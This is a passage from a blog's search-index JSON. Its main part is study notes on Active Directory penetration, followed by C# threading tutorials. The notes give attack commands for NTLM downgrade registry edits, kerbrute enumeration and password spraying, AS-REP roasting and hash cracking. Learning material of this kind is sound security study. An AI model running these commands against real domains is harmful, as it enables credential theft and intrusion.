please click here.\nTHANKS FOR READING\n","categories":["Tools/Eden-RAT"],"tags":["Code","C#","Python","RAT","Pentesting","Tools","Eden-RAT","Remote Access Tool"]},{"title":"[Book] Attack and Denfense About Domain Penetration","url":"/2026/01/01/DomainPenetration1/","content":"El libro\n\n\nIntroductionThis article is used to keep notes and summaries of the book “Attack and Denfense About Domain Penetration”.The content will be continuously updated as I read through the book.\nReflectionThis book might be difficult for readers who are not familiar with Windows.Chapter 1 (Windows Protocols) and Chapter 2 (Fundamentals of Domain), may be tedious, abstract, and confusing for beginners.  \nThis book introduces many protocols and tools related to Active Directory penetration. It is not necessary to understand all the content in the book, such as the usage of tools or the detailed implementation of different protocols and exploitation techniques, because doing so would be time-consuming and difficult for beginners to Windows domains.\nMy suggestion is to first understand the terminology, and then grasp the fundamentals (DON’T GO TOO DEEP!). You will master this knowledge and these skills through hands-on practice.\n\n\n\nLET’S GO!\n\nChapter.1 - Windows Protocols1.1 - NTLM ProtocolNTLM(New Technology LAN Manager) protocol is a well-known authentication protocol introduced by Microsoft and used in Windows environments.\nSSPI and SSP\nSSPI(Security Service/Support Provider Interface) is a suite of interfaces provided by Microsoft Windows. Its functions include:\nAuthentication\nProvides Session Security mechanism for other protocols.\n\n\nSSP(Security Service Provider) implements SSPI interface. Microsoft has implemented multiple SSPs including:\nNTLM SSP\nKerberos SSP\nDigest SSP\nNegotiate SSP\nCred SSP\nSchannel SSP\nPKU2U SSP\n\n\n\n\n    \n        Source: https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/security-support-provider-interface-architecture\n    \n\n\nLM Hash Cryptographic Algorithm\nConvert the user’s plaintext password to uppercase.\nEncode the password using the OEM character set.\nPad the password with null bytes (0x00) or truncate it to exactly 14 bytes.\nSplit the 14-byte password into two 7-byte halves.\nEach 7-byte half is used as a 56-bit DES key material and expanded to a 64-bit DES key by inserting parity bits.\nEach DES key is used to encrypt the fixed ASCII string &quot;KGS!@#$%&quot;.\nConcatenate the two 8-byte ciphertexts to produce the final 16-byte LM hash.\n\n\n    \n        Source: https://www.hackercoolmagazine.com/how-windows-authentication-works/?srsltid=AfmBOopVgjnW7fm4wUOG7pfkjyrq--TEYBE0ULgNVM02-XNCYUbeT7V1\n    \n\n\nNTLM Has Cryptography Algorithm\n\n\n\n\nWindows 2000\nWindows XP\nWindows Server 2003\nWindows Vista\nWindows 7\nWindows Server 2008\nWindows 8\nWindows Server 2012\n\n\n\n\nLM\n✔\n✔\n✔\n\n\nNTLM\n✔\n✔\n✔\n✔\n✔\n✔\n✔\n✔\n\n\n\n\n\nNTLM Hash Encryption Procedure\n\nConvert user’s password into hexadecimal.P@ss1234 -&gt; Hex() = 5040535331323334\nConvert ASCII into Unicode.\nPerform MD4 hash to unicode encoded.\n\nimport hashlibimport binasciiprint(&quot;NTLM_Hash: &quot; + binascii.hexlify(hashlib.new(&quot;md4&quot;, &quot;P@ss1234&quot;.encode(&quot;utf-16le&quot;)).digest()).decode(&quot;utf-8&quot;))\nHow Windows Store NTLM Hash:Windows stores NTLM password hashes in the Security Account Manager (SAM) database, located at C:\\Windows\\System32\\config\\SAM. The hashes are stored in encrypted form and protected by the SYSTEM key.\nWhen a user attempts to log in, the Local Security Authority Subsystem Service (lsass.exe) is responsible for authentication. The user’s plaintext password is not stored on disk. Instead, LSASS computes the NTLM hash of the provided password and compares it against the encrypted NTLM hash stored in the SAM database.\nThe winlogon.exe process is responsible for displaying the logon interface when a user signs out, restarts, or logs on. The entered credentials are passed to LSASS for authentication processing.\nDuring authentication, credential material such as NTLM hashes, Kerberos tickets, and, in some cases, plaintext passwords may temporarily reside in LSASS memory. Tools such as mimikatz can extract these credentials by reading the memory of lsass.exe with sufficient privileges.\n\n\nNTLM Protocol AuthenticationNTLM Protocol based on Challenge/Response, constituted by 3 types of message:\n\nType 1: Negotiate\nType 2: Challenge\nType 3: Authentication\n\nThere are NTLMv1 and NTLMv2, and NTLMv2 is the most popular version. The most significant differences are, the value of Challenge and its algorithm. The common characteristics is they both use NTLM Hash.\n\nAuthentication In A Workgroup\nNegotiation(Type 1):The client initiates contact, sending a message to the server listing its supported NTLM features and capabilities.\nChallenge(Type 2):The server responds, acknowledging the client’s message and sending back a unique, random 16-byte number called a “challenge”(or nunce).\nResponse(Type 3):The clients takes the server’s challenge and encrypts it using a hash of the user’s password(not the password itself).\nVerification:The server receives the response and either verifies it directly or forwards the username, challenge, and response to the DC.\n\n\nAuthentication In A Domain\n\nNegotiation:The user provides cerdentials(Username, password, domain) to the client. The client creates a NTLM hash of password , stores it in local, and sends NTLMSSP_NEGOTIATE message which is created by NTLM SSP. This Type 1 message is constituted by username only.\n\nChallenge:The server(or resource server) receives the username, then sends back a Challenge message(Type 2, aka NTLMSSP_CHALLENGE, created by NTLM SSP) containing a random 16-byte number(nonce) and server flags.\n\n\n\nNTLMv1 v.s. NTLMv2\n\nChallenge\nNTLMv1: 8-byte\nNTLMv2: 16-byte\n\n\nNet-NTLM Hash Cryptography Algorithm:\n\nNTLMv1: DES\nNTLMv2: HMAC-MD5\n\nHow NTLMv1 create Response message:\n\nPadding 16B NTLM Hash to 21B.\nDivided into 3 groups, 7B for each. Use for the keys of DES algorithm.\nEncrypted the Challenge message from the server using DES algorithm with those 3 keys.\nConcate them.\nFormat of Net-NTLMv1 Hash:\nusername::hostname:LM response:NTLM response:challenge\nExtracting Net-NTLM v1 Hash:\n&gt; InternalMonologue.exe\n\n\n\nLmCompatibilityLevel| Value | Description || —- | —- || 0 |  || 1 |  || 2 |  || 3 |  || 4 |  || 5 |  |\n\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\lmcompatibilitylevel. Generally, lmcompatibilitylevel does not exist.\nSet lmcompatibilitylevel to 2:  \n&gt; reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ /v lmcompatibilitylevel /t REG_DWORD /d 2 /f\n\n\n\n\nSecurity issues of NTLM ProtocolThe client creates Type 3 message(NTLMSSP_AUTH) with hash of user’s password. If the attacker doesn’t have user’s password but hash of user’s password, the attacker might perform PTH(Pass The Hash) attack. Also, Type 3 message contains Net-NTLM Hash, the attacker might performs MITM(Man In the Middle), relaying the Net-NTLM hash, this is known as NTLM Relay attack.\n\nPass The Hash(PTH):The attacker performs PTH if the hash cannot be cracked. Passing the hash to other machines, and exploitatinng through port 135 or 445.\nNTLM Relay:More specifically, Net-NTLM Relay.\nNet-NTLM v1 Hash CrackingNet-NTLM v1 Hash can be cracked, regardless strength of password.\n Enable NTLMv1:\n&gt; reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ /v lmcompatibilitylevel /t REG_DWORD /d 2 /f\nTo ensure NTLMv1 is enable:\n&gt; reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0\\ /v NtlmMinClientSec /t REG_DWORD /d 536870912 /f&gt; reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0\\ /v RestrictSendingNTLMTraffic /t REG_DWORD /d 0 /f\n\n\n\n1.2 - Kerberos Protocol\nOperating on DC.\nkrbtgt\nKDC : Key Distribution Center\nTicker\nST : Service Ticket\nTGT : Ticking Gainting Ticket\n\nTGT is required to obtain ST.\n\nPort 88: Authentication.\nPort 464: Password reset.\n\nAS_REQ &amp; AS_REP and TGS_REQ &amp; TGS_REP.S4U: Using for delegation\n\nS4u2Self, S4u2Proxy.\nPAC\n\n\n    \n        Source: https://www.tarlogic.com/blog/how-kerberos-works/\n    \n\n\nPAC (Privilege Attribute Certificate)typedef unsigned long ULONG;typedef unsigned short USHORT;typedef unsigned long64 ULONG64;typedef unsigned char UCHAR;typedef struct _PACTYPE &#123;    ULONG cBuffers;    ULONG Version;    PAC_INFO_BUFFER Buffers[1];    &#125; PACTYPE;typedef struct _PAC_INFO_BUFER &#123;    ULONG ulType;    ULONG cbBufferSize;    ULONG64 Offset;&#125; PAC_INFO_BUFFER;\nPAC_VALIDATION_INFOtypedef struct _KERB_VALIDATION_INFO &#123;  FILETIME LogonTime;  FILETIME LogoffTime;  FILETIME KickOffTime;  FILETIME PasswordLastSet;  FILETIME PasswordCanChange;  FILETIME PasswordMustChange;  RPC_UNICODE_STRING EffectiveName;  RPC_UNICODE_STRING FullName;  RPC_UNICODE_STRING LogonScript;  RPC_UNICODE_STRING ProfilePath;  RPC_UNICODE_STRING HomeDirectory;  RPC_UNICODE_STRING HomeDirectoryDrive;  USHORT LogonCount;  USHORT BadPasswordCount;  ULONG UserId;  ULONG PrimaryGroupId;  ULONG GroupCount;  [size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;  ULONG UserFlags;  USER_SESSION_KEY UserSessionKey;  RPC_UNICODE_STRING LogonServer;  RPC_UNICODE_STRING LogonDomainName;  PISID LogonDomainId;  ULONG Reserved1[2];  ULONG UserAccountControl;  ULONG SubAuthStatus;  FILETIME LastSuccessfulILogon;  FILETIME LastFailedILogon;  ULONG FailedILogonCount;  ULONG Reserved3;  ULONG SidCount;  [size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;  PISID ResourceGroupDomainSid;  ULONG ResourceGroupCount;  [size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;&#125; KERB_VALIDATION_INFO;\nAS-REQ &amp; AS-REPTGT is generated by KDC’s AS(Authentication Service).  \nThe AS-REQ represnets the initial message clients send to the KDC when requesting authentication. This message contains the username.  \nThe AS-REP message contains the requested TGT encrypted with a key derived form the user’s password hash. Under normal circumstances, this message is only sent after successful pre-authentication validation.\nTGS-REQ &amp; TGS-REPAP-REQ &amp; AP-REP Bidirectional AuthenticationAP: Application Protocol\nSecurity Issues of Kerberos Protocol\nPTH: Attacker may performs PTH if the attacker obtained the hash of user’s password.\nPTK: Attacker may performs PTK if the attacker obtained the AES key of user’s password.\nDomain Account Enumeration\nPassword Spraying: Fixed password, different username.\nGolden Ticket Attack: Kerberos authentication relies on a KDC(Key Distribution Center), which issues TGTs(Ticket Granting Tickets) for user authentication. Attackers abuses this process by forging valid Kerberos tickets.\nSilver Ticket Attack: To execute a silver ticket attack, an attacker must already have local administrator access on a compromised machine and obtain the NTLM hash of the targeted service account. Unlike a golden ticket attack, which grants full domain control, a silver ticket attack is more targeted, allowing adversaries to abuse a specific service account while bypassing certain security controls.\nAS-REP Roasting: It is a Kerberos-based credential harvesting technique that targets accounts configured without Kerberos preauthentication. An attacker can request an AS-REP for such an account, receive data encrypted with the account’s long-term key, and crack that encrypted blob offline to recover the plaintext password\n\n1.3 - LDAPLDAP(Lightweight Directory Access Protocol) is a open, vendor-neutral protocol for accessing and managing distributed directory information service. Think of X.500 as the foundational standard for a vast, hierarchical phone book.\nFundamentals\nFundamental Model\nInformation Model: Defines how data is structed and stored.\nNaming Model: Defines how entries are named and organized. DN(Distinguished Name), RDN(Relative Distinguished Name). cn=John Doe,ou=Users,dc=example,dc=com\nFunctional Model: Defines what operations LDAP can perform.\nSecurity Model: Defines how LDAP is protected.\n\n\nApplication Factors\nUnique: Every LDAP entry has a unique Distinguished Name(DN).\nInherit Characteristics: LDAP entries inherit characteritics from object classes.\nReplication: Directory data can be copied across multiple LDAP servers.\nCross-Platform: LDAP is an open standard(RFC-based).\nTree Hierarchy\n\n\n\nGlobal CatalogA Global Catalog is a special domain controller that stores:\n\nA full copy of all objects in its own domain.\nA partial copy of objects from all other domains in the forest.\n\nGenerally, the first domain controller (DC) in a new forest is configured as a Global Catalog (GC).A Global Catalog stores a partial replica of all domains in the forest.The GC listens on port 3268 for LDAP and 3269 for LDAP over SSL.\nChapter.2 - Domain Fundamentals2.1 - Common Terminologies\nstores information about network objects such as user accounts, computer accounts, and groups. Clients use LDAP to query and manage directory information in Active Directory, while Kerberos is used for authentication.\nADDS: Active Directory Domain Service\nLDAP: Lightweight Directory\nDC: Domain Controller\nX.500 Standard\nDC: Domain Component(NOT Domain Controller), the concept is similar to DNS(Domain Name Resolution). For example: foo.com\nOU: Organization Unit\nCN: Common Name\nDN: Distinguished Name\nRDN: Relative Distinguished Name\nUPN: User Principle Name\nContainer: \nFQDN: Fully Qualified Domain Name\n\n\n\n2.2 - Workgroup And DomainWorkgroupDomain\nTypes of Domain\nSingle Domain\nDomain Tree\nDomain Forest\n\n\nCharacteristics of Domain\n\nDomain Functionality Level and Forest Functionality Level\nDomain Functionality Level\n\nForest Functionality Level\n\n\n2.3 - Domain TrustDomain Trust enables resource sharing between multiple domains. Such access is available only when a trusted relationship exists. Domain Trust relies on the Kerberos Protocol for cross-domain authentication.\nTrust Types\nOne-Way Trust:In a one-way trust, domain A trusts domain B. This means users from domain B can access resources in domain A, but users from domain A cannot access resources in domain B. In other words, “I trust you, but you don’t trust me.”\nTwo-Way Trust:Domain A trusts domain B and domain B trusts domain A. Since Windows Server 2003, two-way trust has been the default configuration for domains within the same forest. When a domain is added to a domain tree, a two-way transitivee trust is automatically established.\nShortcut Trust:A shortcut trust is a manually created two-way trust between two domains, typically used to improve authentication performance by shorten the trust path. It DOES NOT OCCUR AUTOMATICALLY and is commonly used in complex or large AD environments.\n\nInteral Trust, External Trust And Forest TrustCross-Domain Access2.4 - Configuration And Setting A Domain2.5 - Local Account and AD AccountLocal AccountThe local accounts can only access resources on the local system and are ioslated to a single machine. The default local accounts are built-in accounts(e,g,m Administrator, Guest). They are created during Windows installation and cannot be deleted.\n\nAdministrator:The Administrator account is created during Windows installation and has full control over the system. It cannot be deleted, but it can be renamed or disable. For security reasons, this account is disabled by default in recent versions of Windows. Instead, Windows provideds the Administrators group for privilege management.To enable the Administrator account:net user Administrator /active:yes\nGuest:The Guest account has a well-known RID of 501 (SID formatL S-1-5-21-XX-501). It is disabled by default.This account allows users to log in with very limited privileges and is the only member of the Guests group.net localgroup Guests\nDefaultAccount:The DefaultAccount is also known as DSMA(Default System Managed Account). It is a built-in account introduced in Windows 10 version 1607 and Windows Server. It is used to run multi-user aware applications(MUMA apps), such as Xbox Shell.It is disabled by default on desktop Windows and Windows Server 2016. The account has a well-known RID of 503, and its SID format is S-1-5-21-XX-503.DSMA is a member of the System Managed Accounts Group, which has the SID S-1-5-32-581.&gt; net localgroup &quot;System Managed Accounts Group&quot;&gt; wmic group get name,sid | findstr &quot;System Managed Accounts Group&quot;\nWDAGUtilityAccount:The WDAGUtilityAccount is an account used by Windows Defender Application Guard, introduced in Windows 10 version 1709 and Windows Server 2016.The account has a well-known RID of 504.\n\nAD AccountAn AD account (Active Directory account) refers to a security principal stored in Active Directory.\nIn Active Directory, accounts are mainly represented by different object types, such as User accounts and Computer accounts.A Service Account is not a distinct account type in AD; it is usually implemented as a User account that is used to run services.\nAn SPN (Service Principal Name) is a Kerberos identifier for a service instance.The presence of an SPN does not strictly indicate a service account, as SPNs can also be assigned to computer accounts.\nTo identify a computer account, properties such as objectClass or a sAMAccountName ending with $ are commonly used. \n\nUser AccountUser Account represents a physical entity, such as a person.\n\nLocal Account on DC(Domain Controller):\nAdministrator:\nGuest:\nkrbtgt:\nUser account’s properties:  \n| Property | Meaning || —- | —- || sn | Surname || giveName | Name || initials | English || displayName, cn and name | Name || co | Country, region || postalCode | Postal code || st | State || l | City || streetAddress | Street address || postOfficeBox | Post office box || badPasswordTime | Date time of last log in failed. |\n\nUser account’s options:\n\n\n\nService AccountA service account is a special user account.\nComputer AccountA computer account is also a special user account, but users cannot log in.\n\nCreate a computer account:\nPython\nPowerShell\n\n\nComputer Account’s Proprities:\nComputer Account and system Account\n\n\n\n2.6 - Local Group and Domain GroupLocal Group&gt; net localgroup&gt; wmic group get name,sid\n\nAdministrators\nUsers\nGuests\nBackup Operators\nRemote Desktop Users\nPower Users\nNetwork COnfiguration Operators:Members of this group are able to configurate settings of TCP/IP, update and offer TCP/IP addresses.\n\nDomain Group\nTypes of Domain Group\nSecuriy Group\nDistribution Group\n\n\nScope of Domain Groups\n| Type | Members | Scope Conversion | Privilege Providence || —- | —- | —- | —- || Universal Group || Global Group || Domain Local Group |\n\nDomain Local Group\nGlobal Group\nUniversal Group\n\n\nBuilt-In Groups of AD\nBuilt-in domain local group\nBuilt-in global group\nBuilt-in universal group\n\n\n\n2.7 - Directory PartitionEvery Domain Controller (DC) running Active Directory Domain Services (AD DS) hosts replicas of one or more directory partitions.  \nA directory partition is also known as a Naming Context (NC).\nIn a typical Active Directory forest, the following directory partitions exist.\n\nDomain Directory Partition——contains domain-specific objects such as users, groups, and computers.\nConfiguration Directory Partition——stores forest-wide configuration data, including sites and replication topology.\nSchema Directory Partiton——defines all object classes and attributes used in Active Directory.\nApplication Directory Partiton——an optional partition used to store application-specific data and replicate it to selected DCs.\n\nDomain Directory PartitionConfiguration Directory PartitionSchema Directory PartitionApplication Directory Partition2.8 - SPN2.9 - Group Policy of A DomainSecurity Issues of Group Policy2.10 - ACL\nSecurity Principals:Security Principal is any entity that can be authenticated(e.g, user’s account, computer’s account, or threads which are running in Security Context)\nSecurity Identifiers (SID):SID is a distinguished identifier of a Security Principal or Security Group\n\nChapter.3 - Domain’s Tools3.1 - BloodHoundBloodHound is based on Linkerious.  \nWe use SharpHound to obtain information:\n\nhttps://github.com/BloodHoundAD/SharpHound3https://github.com/SpecterOps/SharpHound\n\n&gt; SharpHound3.exe -c all\nWe then import the *.zip from last step into BloodHound.\n3.2 - AdfindAdfind is a C++ based AD searching tool.\n\nhttps://github.com/mai-lang-chai/AD-Penetration-Testing-Tools\n\n&gt; Adfind.exe /?\n&gt; Adfind.exe [switches] [-b basedn] [-f filter] [attr list]\n&gt; Adfind.exe -f objectclass=trusteddomain -dn\nQuerying DC# Query name of DC (Domain Controller)&gt; Adfind.exe -sc dclist # Query version of DC (Domain Controller)&gt; Adfind.exe -schema -s base objectversion \nQuerying Computer# Query all computers, display DN only.&gt; Adfind.exe -f &quot;objectcategory=computer&quot; dn# Query all computers, display name and operating system.&gt; Adfind.exe -f &quot;objectcategory=computer&quot; name operatingSystem\n# Query active computer, display DN only.&gt; Adfind.exe -sc computers_active dn# Query active computer, display name and OS.&gt; Adfind.exe -sc computers_active name operatingSystem\n# Query specified computer&#x27;s mail.&gt; Adfind.exe -f &quot;&amp;(objectcategory=computer)(name=mail)&quot;\nQuerying UsersQuerying GroupsQuerying Delegation3.2 - Admod\nhttps://github.com/mai-lang-chai/AD-Penetration-Testing-Tools\n\nAdmod is a C++ based tool, used for AD modification.\n3.4 - LDPLDP is a Microsoft built-in tool, used for AD information querying. This tool is similar to ADExplorer, both of them are LDAP querying tool.\n3.5 - LdapsearchThis is a tool on Unix-like platform. It is a built-in tool of Kali Linux.\n&gt; Ldapsearch -h\n\n\n\n\nParameter\nDescription\n\n\n\n\n-H\nLDAP URI\n\n\n-h\nIP or resolvalbe hostname of LDAP server, cannot be used with -H\n\n\n-p\n\n\n-x\n\n\n-D\n\n\n-w\n\n\n-W\n\n\n\n\nUsage\n\nConnection\nLdapsearch -H ldap://x.x.x.x:389 -D &quot;hack@apt.com&quot; -w P@ss1234\nLdapsearch -h x.x.x.x -p 389 -D &quot;hack@apt.com&quot; -w P@ss1234\nImportant: -H ≠ -h\n\nFiltering\nDisplay\n\n\n3.6 - PingCastlePingCastle is a tool built by CERT of ENGINE on France.  \nIt is a free, open-source tool and methodology for assessing AD security.\n\nhealthcheck\nconso\ncarto\nscanner\nexport\nadvanced\n\n3.7 - KekeoKekeo is a tool for exploiting Kerberos. It is written by Benjamin, the author of mimikatz\n\nhttps://github.com/gentilkiwi/kekeo\n\nThis tool has the following modules:\n\nstandard(coffee…?)\nothers(Significant parts!)\n\n3.8 - RubeusRubeus is a C# based tool. It is used for exploiting Kerberos Protocol.\n\nhttps://github.com/GhostPack/Rubeus\n\n3.9 - mimikatzmimikatz is a powerful tool used for Windows security.\n\nhttps://github.com/gentilkiwi/mimikatz\n\n3.10 - Impacket\nhttps://github.com/fortra/impacket/tree/master/examples\n\nChapter.4 - Penetration Methods In Domain4.1 - Domain Account EnumerationDuring the AS-REQ stage of Kerberos authentication, the cname (client principal name) field in the request corresponds to the user principal being authenticated.  \nThe KDC responds differently depending on the state of the account, such as whether the user exists, is enabled, or does not exist.These differences can be observed through distinct Kerberos responses or error codes.  \nAs a result, it is possible to enumerate domain user accounts by analyzing the KDC responses to AS-REQ messages.\n\n\n\n\nUsers’ State\nAS-REP information\n\n\n\n\nUser exists and is enabled\nKDC_ERR_PREAUTH_REQUIRED\n\n\nUser exists and is disabled\nKDC_ERR_CLIENT_REVOKED NT Status: STATUS_ACCOUNT_DISABLED (Unavailable)\n\n\nUser does not exist\nKDC_ERR_C_PRINCIPAL_UNKNOWN\n\n\n\n\n\nKerbrute&gt; kerbrute_windows_amd64.exe userenum --dc x.x.x.x -d apt.com user.txt\npyKerbrute# TCP mode&gt; python EnumADUser.py x.x.x.x apt.com user.txt tcp# UDP mode&gt; python EnumADUser.py x.x.x.x apt.com user.txt udp\n\n\n4.2 - Password SprayingPassword spraying is usually performed after domain account enumeration.\nDuring the AS-REQ stage of Kerberos authentication, the cname (client principal name) field corresponds to the target username.This behavior allows attackers to enumerate valid domain accounts.  \nPassword spraying involves testing a single common password against multiple usernames, rather than multiple passwords against a single account.The goal of this technique is to reduce the likelihood of account lockouts enforced by domain lockout policies.\n\nKerbrute&gt; kerbrute_windows_amd64.exe passwordspray --dc x.x.x.x -d apt.com user.txt P@ssword\npyKerbrute# Plain text password&gt; python ADPwdSpray.py x.x.x.x apt.com user.txt clearpassword P@ssword tcp&gt; python ADPwdSpray.py x.x.x.x apt.com user.txt clearpassword P@ssword udp# Hashed password&gt; python ADPwdSpray.py x.x.x.x apt.com user.txt ntlmhash &lt;Your NTLM Hash&gt; tcp&gt; python ADPwdSpray.py x.x.x.x apt.com user.txt ntlmhash &lt;Your NTLM Hash&gt; udp\n\n\n4.3 - AS-REP RoastingAS-REP Roasting is an offline password cracking technique targeting user accounts. This method is limited because it requires Kerberos pre-authentication to be disabled.\n\nExtract AS-REP Hashes:  \n\nRubeus:If the compromised host is domain-joined:\n&gt; Rubeus.exe asreproast /format:john /outfile:hash.txt\n\nASREPRoast.ps1:If the compromised host is not domain-joined, AS-REP Roasting cannot be performed directly and requires alternative enumeration methods:\nPS&gt; Import-Module .\\ASREPRoast.ps1 Invoke-ASREPRoast | select -ExpandProperty Hash\n\nComputer is not in a domain\n\n\n\nHash Cracking:John:\n&gt; john --wordlist=/opt/pass.txt hash.txt\nhashcat:  \nhashcat -m 18200 hash.txt pass.txt --force\n\n\n4.4 - KerberoastingKerberoasting happens at the TGS-REP stage of Kerberos authentication. TGS service of KDC responses a hashed ST to user’s of the client. The attacker might performs offline cracking after the ST was received.   \nThe nutshell of Kerberoasting is: RC4_HMAC_MD5 is used during Negotiation stage.\nSPN Discovery\nRiskySPN\nGetUserSPNs\n\n4.5 - DelegationTypes of Delegation\nUD (Unconstrained Delegation)\nCD (Constrained Delegation)\nRBCD (Resource Based Constrained Delegation)\n\n\nUnconstrained Delegation\nConstrained Delegation\nResource Based COnstrained Delegation\n\n4.6 - Kerberos Bronze Bit4.7 - NTLM Relay4.8 - Abusing DCSync4.9 - PTH4.10 - Locating Logged In Computer4.11 - Domain Forest PenetrationChapter.5 - Domain Exploitation5.1 - MS14-0685.2 - CVE-2019-1040 NTLM MIC5.3 - CVE-2020-1472 NetLogon Privilege Escalation5.4 - Windows Print Spooler Privilege Escalation5.5 - ADCS Exploitation5.6 - CVE-2021-42287 Privilege Escalation5.7 - Exchange ProxyLogon Exploitation5.8 - Exchange ProxyShell Kill ChainChapter.6 - Persistence And Post-Exploitation Password ExtractionTHANKS FOR READING!\n","categories":["Book"],"tags":["Book","Learning","Note","Blackhat","Hacking","Hack","LAN","Domain","Penetration","Pentest","PrivilegeEscalation","Privilege"]},{"title":"[Code] C# - Simple way to pass parameters to Thread() method and invoke control","url":"/2024/12/04/CSharp-ThreadWithParameters/","content":"AbstractToday, I’ll share a straightforward approach to passing parameters to the Thread method in C#. I’ll also cover how to invoke a control safely within a thread.\nThe Common Approach You See OnlineThis is what I saw in online:void Function1(object data)&#123;    //SOME CODE...&#125;void Function2(object data)&#123;    object[] objs = (object[])data; //Convert object into object array.    int x = (int)objs[0]; //Convert 1st element into integer.    string y = (string)objs[1]; //Convert 2nd element into integer.    //SOME CODE.....&#125;//Function 1object obj = &quot;Hello world!&quot;;Thread thread1 = new Thread(new ParameterizedThreadStart(Function1));thread1.Start(obj);//Function 2object[] objs = new object[] &#123; 666, &quot;What?&quot; &#125;;Thread thread1 = new Thread(new ParameterizedThreadStart(Function2));thread1.Start(objs);This method works but feels clunky and error-prone. It involves boxing/unboxing and manually unpacking parameters, which isn’t ideal.\nA Simpler Way to Pass ParametersWe can use the lamda functionvoid Function(int x, string y)&#123;    //SOME CODE.....&#125;Thread thread = new Thread(() =&gt; Function(666, &quot;Good&quot;));thread.Start();With this approach, the Thread constructor doesn’t need a separate method like ParameterizedThreadStart. Instead, the lambda expression lets you pass the exact arguments to your method.\nGoing Even FurtherIf you don’t need to reuse the thread reference, you can make it even cleanervoid Function(int x, string y)&#123;    //SOME CODE.....&#125;new Thread(() =&gt; Function(666, &quot;Nice&quot;)).Start();\nThis method eliminates the need for intermediate objects entirely. It’s cleaner, concise, and less error-prone.\nAdditionMore elegant waysvoid Function(int x, string y)&#123;    // SOME CODE...&#125;Task.Run(() =&gt; Function(666, &quot;Oh...&quot;));This is concise, highly readable, and works seamlessly with async/await patterns.\n\nvoid Function(int x, string y)&#123;    // SOME CODE...&#125;ThreadPool.QueueUserWorkItem(_ =&gt; Function(666, &quot;ThreadPool&quot;));\nThread pooling is efficient and avoids the overhead of creating a dedicated thread for every task!\n","tags":["Code","C#","Program"]},{"title":"【Code】C# 元件Invoke的方法","url":"/2023/06/14/%E3%80%90Code%E3%80%91CSharpInvokeMethod/","content":"前言記錄一下C#中可以在Thread中存取Controls的方法\nC# 元件執行程式C# WindowsForm中我們可以把要執行的程式寫在元件的事件(Event)中，例如button1按下後可以彈出MessageBox的程式為private void button1_Click(object sender, EventArgs e)&#123;    MessageBox.Show(&quot;Hello world&quot;);    //MessageBox.Show(&quot;Hello world&quot;,&quot;Here is the test&quot;, MessageBoxButtons.OK, MessageBoxIcon.Error);&#125;\n如果我們要把Hello world顯示在TextBox1上，那程式就會是private void button1_Click(object sender, EventArgs e)&#123;    textBox1.Text = &quot;Hello world&quot;;&#125;\n需要時間的程式現在考慮一個ConsoleApplication要把數字 i = 0 ~ 9999一行一行地顯示在Console上，這很簡單 :for (int i = 0; i &lt; 10000; i++)&#123;    Console.WriteLine(i);&#125;\n可是如果在WindowsForm中要把 i = 0 ~ 9999一行一行地顯示在textBox1上呢 ?for (int i = 0 ; i &lt; 10000; i++)&#123;    textBox1.AppendText(i.ToString());    textBox1.AppendText(Environment.NewLine);&#125;然後把這程式放到Button1內 :private void button1_Click(object sender, EventArgs e)&#123;    for (int i = 0 ; i &lt; 10000; i++)    &#123;        textBox1.AppendText(i.ToString());        textBox1.AppendText(Environment.NewLine);    &#125;&#125;好像很簡單對吧 ? 但事實不是這樣，當你執行後你會發現你的WindowsForm根本動不了，過了一段時間後WindowsForm可以動，然後數字 0 ~ 9999會突然出現在textBox1上，可是現在我想要的結果是數字會像在ConsoleApplication上一行一行地顯示在TextBox上，而不是這樣突然出現，何況程式還會突然卡死。\n原因UI Thread (Main Thread)WindowsForm在不使用其他Thread的時候在程式打開(打開.exe檔)的一刻到程式關掉時，所有事都會發生在UI Thread上，例如for loop，Thread.Sleep()，Button按鍵等等，甚至包括WindowsForm本身的上下左右移動，也就是說當你按下button1時，程式就會進入for loop，而此時for loop就是發生在UI Thread上，直到for loop結束，UI Thread才會從for loop跑出來，可是在for loop結束之前，你的for loop都無法跑出來，也就不能對WindowsForm進行住何操作，而數字顯示在textBox1上這件事也是發生在UI Thread上，但此時UI Thread還在for loop當中，所以這就是為甚麼你的程式不能移動，也不會馬上顯示數字。\n解決方法Thread這邊我們會想到可以建立一個新的Thread，用這個Thread去執行for loop，具體方法如下 :void RunLoop()&#123;    for (int i = 0 ; i &lt; 10000; i++)    &#123;        textBox1.AppendText(i.ToString());        textBox1.AppendText(Environment.NewLine);    &#125;&#125;private void button1_Click(object sender, EventArgs e)&#123;    new Thread(RunLoop).Start();&#125;看上去合理的程式，執行看看，又出現問題了，IDE會直接跟你說跨執行緒作業無效。\n原因新的Thread不能直接存取另外一個Thread，需要再加上一些東西，可以使用delegate或MethodInvoke的方法解決，這邊我提供一個我自己常用的方法，就是直接對元件Invoke\n對元件直接Invokevoid RunLoop()&#123;    for (int i = 0 ; i &lt; 10000; i++)    &#123;        textBox1.Invoke(new Action(() =&gt;         &#123;            textBox1.AppendText(i.ToString());            textBox1.AppendText(Environment.NewLine);        &#125;));        //或者以下寫法        //textBox1.Invoke(new Action(() =&gt; textBox1.AppendText(i.ToString())));        //textBox1.Invoke(new Action(() =&gt; textBox1.AppendText(Environment.NewLine)));    &#125;&#125;private void button1_Click(object sender, EventArgs e)&#123;    new Thread(RunLoop).Start();&#125;\n如此一來，數字就可以一行一行顯示\n傳參數一個參數現在讓for loop的最大數字可控 :void RunLoop(object o)&#123;    for (int i = 0 ; i &lt; (int)o; i++)    &#123;        textBox1.Invoke(new Action(() =&gt;         &#123;            textBox1.AppendText(i.ToString());            textBox1.AppendText(Environment.NewLine);        &#125;));        //或者以下寫法        //textBox1.Invoke(new Action(() =&gt; textBox1.AppendText(i.ToString())));        //textBox1.Invoke(new Action(() =&gt; textBox1.AppendText(Environment.NewLine)));    &#125;&#125;private void button1_Click(object sender, EventArgs e)&#123;    object o = 10;    new Thread(RunLoop).Start();&#125;\n多個參數現在讓for loop的最大數字可控且在指定TextBox顯示 :void RunLoop(object o)&#123;    object[] obj_array = (object[])o;    int 